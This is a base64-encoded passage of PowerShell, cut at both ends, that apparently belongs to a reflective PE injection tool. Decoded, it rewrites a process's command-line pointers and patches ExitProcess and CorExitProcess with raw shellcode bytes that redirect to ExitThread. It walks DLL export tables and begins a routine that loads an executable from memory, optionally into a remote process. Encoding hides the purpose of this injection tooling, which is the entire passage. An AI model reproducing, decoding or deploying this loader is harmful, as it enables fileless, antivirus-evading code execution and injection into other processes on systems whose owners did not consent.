BZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkRGxsSGFuZGxlLCAiX2FjbWRsbiIpCiAgICAgICAgICAgICAgICBpZiAoJFdDbWRMbkFkZHIgLWVxIFtJbnRQdHJdOjpaZXJvIC1vciAkQUNtZExuQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIkVycm9yLCBjb3VsZG4ndCBmaW5kIF93Y21kbG4gb3IgX2FjbWRsbiIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJE5ld0FDbWRMblB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbEFuc2koJEV4ZUFyZ3VtZW50cykKICAgICAgICAgICAgICAgICROZXdXQ21kTG5QdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxVbmkoJEV4ZUFyZ3VtZW50cykKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgI01ha2UgYSBjb3B5IG9mIHRoZSBvcmlnaW5hbCBjaGFyKiBhbmQgd2NoYXJfdCogc28gdGhlc2UgdmFyaWFibGVzIGNhbiBiZSByZXR1cm5lZCBiYWNrIHRvIHRoZWlyIG9yaWdpbmFsIHN0YXRlCiAgICAgICAgICAgICAgICAkT3JpZ0FDbWRMblB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRBQ21kTG5BZGRyLCBbVHlwZV1bSW50UHRyXSkKICAgICAgICAgICAgICAgICRPcmlnV0NtZExuUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFdDbWRMbkFkZHIsIFtUeXBlXVtJbnRQdHJdKQogICAgICAgICAgICAgICAgJE9yaWdBQ21kTG5QdHJTdG9yYWdlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQdHJTaXplKQogICAgICAgICAgICAgICAgJE9yaWdXQ21kTG5QdHJTdG9yYWdlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQdHJTaXplKQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJE9yaWdBQ21kTG5QdHIsICRPcmlnQUNtZExuUHRyU3RvcmFnZSwgJGZhbHNlKQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJE9yaWdXQ21kTG5QdHIsICRPcmlnV0NtZExuUHRyU3RvcmFnZSwgJGZhbHNlKQogICAgICAgICAgICAgICAgJFJldHVybkFycmF5ICs9ICwoJEFDbWRMbkFkZHIsICRPcmlnQUNtZExuUHRyU3RvcmFnZSwgJFB0clNpemUpCiAgICAgICAgICAgICAgICAkUmV0dXJuQXJyYXkgKz0gLCgkV0NtZExuQWRkciwgJE9yaWdXQ21kTG5QdHJTdG9yYWdlLCAkUHRyU2l6ZSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRBQ21kTG5BZGRyLCBbVUludDMyXSRQdHJTaXplLCBbVUludDMyXSgkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSksIFtSZWZdJE9sZFByb3RlY3RGbGFnKQogICAgICAgICAgICAgICAgaWYgKCRTdWNjZXNzID0gJGZhbHNlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCROZXdBQ21kTG5QdHIsICRBQ21kTG5BZGRyLCAkZmFsc2UpCiAgICAgICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRBQ21kTG5BZGRyLCBbVUludDMyXSRQdHJTaXplLCBbVUludDMyXSgkT2xkUHJvdGVjdEZsYWcpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJFdDbWRMbkFkZHIsIFtVSW50MzJdJFB0clNpemUsIFtVSW50MzJdKCRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpCiAgICAgICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgPSAkZmFsc2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJE5ld1dDbWRMblB0ciwgJFdDbWRMbkFkZHIsICRmYWxzZSkKICAgICAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJFdDbWRMbkFkZHIsIFtVSW50MzJdJFB0clNpemUsIFtVSW50MzJdKCRPbGRQcm90ZWN0RmxhZyksIFtSZWZdJE9sZFByb3RlY3RGbGFnKSB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgIAogICAgICAgIAogICAgICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAjTmV4dCBvdmVyd3JpdGUgQ29yRXhpdFByb2Nlc3MgYW5kIEV4aXRQcm9jZXNzIHRvIGluc3RlYWQgRXhpdFRocmVhZC4gVGhpcyB3YXkgdGhlIGVudGlyZSBQb3dlcnNoZWxsIHByb2Nlc3MgZG9lc24ndCBkaWUgd2hlbiB0aGUgRVhFIGV4aXRzLgoKICAgICAgICAkUmV0dXJuQXJyYXkgPSBAKCkKICAgICAgICAkRXhpdEZ1bmN0aW9ucyA9IEAoKSAjQXJyYXkgb2YgZnVuY3Rpb25zIHRvIG92ZXJ3cml0ZSBzbyB0aGUgdGhyZWFkIGRvZXNuJ3QgZXhpdCB0aGUgcHJvY2VzcwogICAgICAgIAogICAgICAgICNDb3JFeGl0UHJvY2VzcyAoY29tcGlsZWQgaW4gdG8gdmlzdWFsIHN0dWRpbyBjKyspCiAgICAgICAgW0ludFB0cl0kTXNjb3JlZUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJtc2NvcmVlLmRsbCIpCiAgICAgICAgaWYgKCRNc2NvcmVlSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIHRocm93ICJtc2NvcmVlIGhhbmRsZSBudWxsIgogICAgICAgIH0KICAgICAgICBbSW50UHRyXSRDb3JFeGl0UHJvY2Vzc0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRNc2NvcmVlSGFuZGxlLCAiQ29yRXhpdFByb2Nlc3MiKQogICAgICAgIGlmICgkQ29yRXhpdFByb2Nlc3NBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJDb3JFeGl0UHJvY2VzcyBhZGRyZXNzIG5vdCBmb3VuZCIKICAgICAgICB9CiAgICAgICAgJEV4aXRGdW5jdGlvbnMgKz0gJENvckV4aXRQcm9jZXNzQWRkcgogICAgICAgIAogICAgICAgICNFeGl0UHJvY2VzcyAod2hhdCBub24tbWFuYWdlZCBwcm9ncmFtcyB1c2UpCiAgICAgICAgW0ludFB0cl0kRXhpdFByb2Nlc3NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJFeGl0UHJvY2VzcyIpCiAgICAgICAgaWYgKCRFeGl0UHJvY2Vzc0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIkV4aXRQcm9jZXNzIGFkZHJlc3Mgbm90IGZvdW5kIgogICAgICAgIH0KICAgICAgICAkRXhpdEZ1bmN0aW9ucyArPSAkRXhpdFByb2Nlc3NBZGRyCiAgICAgICAgCiAgICAgICAgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCiAgICAgICAgZm9yZWFjaCAoJFByb2NFeGl0RnVuY3Rpb25BZGRyIGluICRFeGl0RnVuY3Rpb25zKQogICAgICAgIHsKICAgICAgICAgICAgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wID0gJFByb2NFeGl0RnVuY3Rpb25BZGRyCiAgICAgICAgICAgICNUaGUgZm9sbG93aW5nIGlzIHRoZSBzaGVsbGNvZGUgKFNoZWxsY29kZTogRXhpdFRocmVhZC5hc20pOgogICAgICAgICAgICAjMzJiaXQgc2hlbGxjb2RlCiAgICAgICAgICAgIFtCeXRlW11dJFNoZWxsY29kZTEgPSBAKDB4YmIpCiAgICAgICAgICAgIFtCeXRlW11dJFNoZWxsY29kZTIgPSBAKDB4YzYsIDB4MDMsIDB4MDEsIDB4ODMsIDB4ZWMsIDB4MjAsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4YmIpCiAgICAgICAgICAgICM2NGJpdCBzaGVsbGNvZGUgKFNoZWxsY29kZTogRXhpdFRocmVhZC5hc20pCiAgICAgICAgICAgIGlmICgkUHRyU2l6ZSAtZXEgOCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgW0J5dGVbXV0kU2hlbGxjb2RlMSA9IEAoMHg0OCwgMHhiYikKICAgICAgICAgICAgICAgIFtCeXRlW11dJFNoZWxsY29kZTIgPSBAKDB4YzYsIDB4MDMsIDB4MDEsIDB4NDgsIDB4ODMsIDB4ZWMsIDB4MjAsIDB4NjYsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4NDgsIDB4YmIpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgW0J5dGVbXV0kU2hlbGxjb2RlMyA9IEAoMHhmZiwgMHhkMykKICAgICAgICAgICAgJFRvdGFsU2l6ZSA9ICRTaGVsbGNvZGUxLkxlbmd0aCArICRQdHJTaXplICsgJFNoZWxsY29kZTIuTGVuZ3RoICsgJFB0clNpemUgKyAkU2hlbGxjb2RlMy5MZW5ndGgKICAgICAgICAgICAgCiAgICAgICAgICAgIFtJbnRQdHJdJEV4aXRUaHJlYWRBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJFeGl0VGhyZWFkIikKICAgICAgICAgICAgaWYgKCRFeGl0VGhyZWFkQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJFeGl0VGhyZWFkIGFkZHJlc3Mgbm90IGZvdW5kIgogICAgICAgICAgICB9CgogICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJFByb2NFeGl0RnVuY3Rpb25BZGRyLCBbVUludDMyXSRUb3RhbFNpemUsIFtVSW50MzJdJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUsIFtSZWZdJE9sZFByb3RlY3RGbGFnKQogICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAjTWFrZSBjb3B5IG9mIG9yaWdpbmFsIEV4aXRQcm9jZXNzIGJ5dGVzCiAgICAgICAgICAgICRFeGl0UHJvY2Vzc09yaWdCeXRlc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG90YWxTaXplKQogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMubWVtY3B5Lkludm9rZSgkRXhpdFByb2Nlc3NPcmlnQnl0ZXNQdHIsICRQcm9jRXhpdEZ1bmN0aW9uQWRkciwgW1VJbnQ2NF0kVG90YWxTaXplKSB8IE91dC1OdWxsCiAgICAgICAgICAgICRSZXR1cm5BcnJheSArPSAsKCRQcm9jRXhpdEZ1bmN0aW9uQWRkciwgJEV4aXRQcm9jZXNzT3JpZ0J5dGVzUHRyLCAkVG90YWxTaXplKQogICAgICAgICAgICAKICAgICAgICAgICAgI1dyaXRlIHRoZSBFeGl0VGhyZWFkIHNoZWxsY29kZSB0byBtZW1vcnkuIFRoaXMgc2hlbGxjb2RlIHdpbGwgd3JpdGUgMHgwMSB0byBFeGVEb25lQnl0ZVB0ciBhZGRyZXNzIChzbyBQUyBrbm93cyB0aGUgRVhFIGlzIGRvbmUpLCB0aGVuIAogICAgICAgICAgICAjICAgY2FsbCBFeGl0VGhyZWFkCiAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUxIC1NZW1vcnlBZGRyZXNzICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcAogICAgICAgICAgICAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgKCRTaGVsbGNvZGUxLkxlbmd0aCkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEV4ZURvbmVCeXRlUHRyLCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAsICRmYWxzZSkKICAgICAgICAgICAgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wICRQdHJTaXplCiAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUyIC1NZW1vcnlBZGRyZXNzICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcAogICAgICAgICAgICAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgKCRTaGVsbGNvZGUyLkxlbmd0aCkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEV4aXRUaHJlYWRBZGRyLCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAsICRmYWxzZSkKICAgICAgICAgICAgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wICRQdHJTaXplCiAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUzIC1NZW1vcnlBZGRyZXNzICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcAoKICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkUHJvY0V4aXRGdW5jdGlvbkFkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKSB8IE91dC1OdWxsCiAgICAgICAgfQogICAgICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiAgICAgICAgV3JpdGUtT3V0cHV0ICRSZXR1cm5BcnJheQogICAgfQogICAgCiAgICAKICAgICNUaGlzIGZ1bmN0aW9uIHRha2VzIGFuIGFycmF5IG9mIGFycmF5cywgdGhlIGlubmVyIGFycmF5IG9mIGZvcm1hdCBAKCREZXN0QWRkciwgJFNvdXJjZUFkZHIsICRDb3VudCkKICAgICMgICBJdCBjb3BpZXMgQ291bnQgYnl0ZXMgZnJvbSBTb3VyY2UgdG8gRGVzdGluYXRpb24uCiAgICBGdW5jdGlvbiBDb3B5LUFycmF5T2ZNZW1BZGRyZXNzZXMKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtBcnJheVtdXQogICAgICAgICRDb3B5SW5mbywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkZ1bmN0aW9ucywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkNvbnN0YW50cwogICAgICAgICkKCiAgICAgICAgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCiAgICAgICAgZm9yZWFjaCAoJEluZm8gaW4gJENvcHlJbmZvKQogICAgICAgIHsKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLm1lbWNweS5JbnZva2UoJEluZm9bMF0sICRJbmZvWzFdLCBbVUludDY0XSRJbmZvWzJdKSB8IE91dC1OdWxsCiAgICAgICAgICAgIAogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKICAgICAgICB9CiAgICB9CgoKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICMjIyMjIyMjIyMgICAgRlVOQ1RJT05TICAgIyMjIyMjIyMjIyMKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgIEZ1bmN0aW9uIEdldC1NZW1vcnlQcm9jQWRkcmVzcwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUEVIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdW5jdGlvbk5hbWUKICAgICAgICApCiAgICAgICAgCiAgICAgICAgJFdpbjMyVHlwZXMgPSBHZXQtV2luMzJUeXBlcwogICAgICAgICRXaW4zMkNvbnN0YW50cyA9IEdldC1XaW4zMkNvbnN0YW50cwogICAgICAgICRQRUluZm8gPSBHZXQtUEVEZXRhaWxlZEluZm8gLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgCiAgICAgICAgI0dldCB0aGUgZXhwb3J0IHRhYmxlCiAgICAgICAgaWYgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5FeHBvcnRUYWJsZS5TaXplIC1lcSAwKQogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuIFtJbnRQdHJdOjpaZXJvCiAgICAgICAgfQogICAgICAgICRFeHBvcnRUYWJsZVB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuRXhwb3J0VGFibGUuVmlydHVhbEFkZHJlc3MpCiAgICAgICAgJEV4cG9ydFRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEV4cG9ydFRhYmxlUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9FWFBPUlRfRElSRUNUT1JZKQogICAgICAgIAogICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJEV4cG9ydFRhYmxlLk51bWJlck9mTmFtZXM7ICRpKyspCiAgICAgICAgewogICAgICAgICAgICAjQWRkcmVzc09mTmFtZXMgaXMgYW4gYXJyYXkgb2YgcG9pbnRlcnMgdG8gc3RyaW5ncyBvZiB0aGUgbmFtZXMgb2YgdGhlIGZ1bmN0aW9ucyBleHBvcnRlZAogICAgICAgICAgICAkTmFtZU9mZnNldFB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkRXhwb3J0VGFibGUuQWRkcmVzc09mTmFtZXMgKyAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQzMl0pKSkKICAgICAgICAgICAgJE5hbWVQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE5hbWVPZmZzZXRQdHIsIFtUeXBlXVtVSW50MzJdKSkKICAgICAgICAgICAgJE5hbWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJE5hbWVQdHIpCgogICAgICAgICAgICBpZiAoJE5hbWUgLWNlcSAkRnVuY3Rpb25OYW1lKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjQWRkcmVzc09mTmFtZU9yZGluYWxzIGlzIGEgdGFibGUgd2hpY2ggY29udGFpbnMgcG9pbnRzIHRvIGEgV09SRCB3aGljaCBpcyB0aGUgaW5kZXggaW4gdG8gQWRkcmVzc09mRnVuY3Rpb25zCiAgICAgICAgICAgICAgICAjICAgIHdoaWNoIGNvbnRhaW5zIHRoZSBvZmZzZXQgb2YgdGhlIGZ1bmN0aW9uIGluIHRvIHRoZSBETEwKICAgICAgICAgICAgICAgICRPcmRpbmFsUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRFeHBvcnRUYWJsZS5BZGRyZXNzT2ZOYW1lT3JkaW5hbHMgKyAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQxNl0pKSkKICAgICAgICAgICAgICAgICRGdW5jSW5kZXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkT3JkaW5hbFB0ciwgW1R5cGVdW1VJbnQxNl0pCiAgICAgICAgICAgICAgICAkRnVuY09mZnNldEFkZHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoJEV4cG9ydFRhYmxlLkFkZHJlc3NPZkZ1bmN0aW9ucyArICgkRnVuY0luZGV4ICogW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtVSW50MzJdKSkpCiAgICAgICAgICAgICAgICAkRnVuY09mZnNldCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRGdW5jT2Zmc2V0QWRkciwgW1R5cGVdW1VJbnQzMl0pCiAgICAgICAgICAgICAgICByZXR1cm4gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRGdW5jT2Zmc2V0KQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBbSW50UHRyXTo6WmVybwogICAgfQoKCiAgICBGdW5jdGlvbiBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlICldCiAgICAgICAgW0J5dGVbXV0KICAgICAgICAkUEVCeXRlcywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRFeGVBcmdzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFJlbW90ZVByb2NIYW5kbGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzKV0KICAgICAgICBbQm9vbF0KICAgICAgICAkRm9yY2VBU0xSID0gJGZhbHNlCiAgICAgICAgKQogICAgICAgIAogICAgICAgICRQdHJTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKQogICAgICAgIAogICAgICAgICNHZXQgV2luMzIgY29uc3RhbnRzIGFuZCBmdW5jdGlvbnMKICAgICAgICAkV2luMzJDb25zdGFudHMgPSBHZXQtV2luMzJDb25zdGFudHMKICAgICAgICAkV2luMzJGdW5jdGlvbnMgPSBHZXQtV2luMzJGdW5jdGlvbnMKICAgICAgICAkV2luMzJUeXBlcyA9IEdldC1XaW4zMlR5cGVzCiAgICAgICAgCiAgICAgICAgJFJlbW90ZUxvYWRpbmcgPSAkZmFsc2UKICAgICAgICBpZiAoKCRSZW1vdGVQcm9jSGFuZGxlIC1uZSAkbnVsbCkgLWFuZCAoJFJlbW90ZVByb2NIYW5kbGUgLW5lIFtJbnRQdHJdOjpaZXJvKSkKICAgICAgICB7CiAgICAgICAgICAgICRSZW1vdGVMb2FkaW5nID0gJHRydWUKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgI0dldCBiYXNpYyBQRSBpbmZvcm1hdGlvbgogICAgICAgIFdyaXRlLVZlcmJvc2UgIkdldHRpbmcgYmFzaWMgUEUgaW5mb3JtYXRpb24gZnJvbSB0aGUgZmlsZSIKICAgICAgICAkUEVJbmZvID0gR2V0LVBFQmFzaWNJbmZvIC1QRUJ5dGVzICRQRUJ5dGVzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCiAgICAgICAgJE9yaWdpbmFsSW1hZ2VCYXNlID0gJFBFSW5mby5PcmlnaW5hbEltYWdlQmFzZQogICAgICAgICROWENvbXBhdGlibGUgPSAkdHJ1ZQogICAgICAgIGlmICgoW0ludF0gJFBFSW5mby5EbGxDaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OWF9DT01QQVQpI